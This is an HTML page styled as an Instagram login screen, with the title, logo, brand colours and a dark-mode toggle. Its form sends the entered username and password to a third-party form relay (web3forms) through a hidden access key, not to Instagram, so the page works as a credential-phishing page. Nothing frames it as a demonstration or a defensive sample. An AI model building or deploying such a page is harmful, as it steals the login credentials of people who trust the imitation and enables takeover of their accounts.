<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #fafafa;
            color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            transition: background-color 0.3s, color 0.3s;
        }

        .dark-mode {
            background-color: #121212;
            color: #fafafa;
        }

        .container {
            text-align: center;
            width: 350px; /* Adjusted width for better layout */
        }

        .logo img {
            width: 90px; /* Adjusted logo size */
            margin-bottom: 20px;
        }

        .login-form {
            display: flex;
            flex-direction: column;
            margin-bottom: 20px;
        }

        .login-form input {
            margin: 10px 0;
            padding: 12px; /* Increased padding for input fields */
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 14px; /* Adjusted font size */
            background-color: #fff;
            color: #000;
            transition: background-color 0.3s, color 0.3s;
        }

        .dark-mode .login-form input {
            background-color: #1e1e1e;
            color: #fafafa;
            border: 1px solid #444;
        }

        .login-form button {
            padding: 12px; /* Increased padding for button */
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px; /* Adjusted font size */
            transition: background-color 0.3s;
        }

        .login-form button:hover {
            background-color: #007bbf;
        }

        .forgot-password {
            margin-top: 10px;
            text-decoration: none;
            color: #00376b;
            font-size: 14px; /* Adjusted font size */
        }

        .signup {
            margin-top: 20px;
            font-size: 14px; /* Adjusted font size */
        }

        .signup a {
            color: #0095f6; /* Make the sign-up link color similar to Instagram */
            text-decoration: none;
        }

        .signup a:hover {
            text-decoration: underline; /* Underline on hover */
        }

        .success-message {
            display: none; /* Hidden by default */
            font-size: 18px;
            color: green;
            margin-top: 20px;
        }

        .dark-mode .success-message {
            color: #4caf50;
        }

        .theme-toggle {
            position: absolute;
            top: 10px;
            right: 10px;
            padding: 10px 20px;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: background-color 0.3s, color 0.3s;
        }

        .dark-mode .theme-toggle {
            background-color: #007bbf;
            color: #fafafa;
        }

        .theme-toggle:hover {
            background-color: #005f9c;
        }
    </style>
</head>
<body>
    <button class="theme-toggle" onclick="toggleTheme()">ðŸŒ™</button>
    <div class="container">
        <div class="logo">
            <img src="ok.png" alt="Instagram Logo"> <!-- Make sure this is the correct path to your logo -->
        </div>
        <form class="login-form" action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="3a0cc51d-55e2-492a-bb04-c7ba1b276da6">
            <input name="username" type="text" placeholder="Username" required>
            <input name="passsword" type="password" placeholder="Password" required>
            <button type="submit">Log In</button>
            <a href="#" class="forgot-password">Forgot password?</a>
        </form>
        <div class="signup">
            <p>Don't have an account? <a href="#">Sign Up</a></p>
        </div>
        <div class="success-message">
            Successfully logged in!
        </div>
    </div>

    <script>
        function toggleTheme() {
            const body = document.body;
            body.classList.toggle('dark-mode');
            const themeButton = document.querySelector('.theme-toggle');
            if (body.classList.contains('dark-mode')) {
                themeButton.textContent = "â˜€";
            } else {
                themeButton.textContent = "ðŸŒ™";
            }
        }
    </script>
</body>
</html>
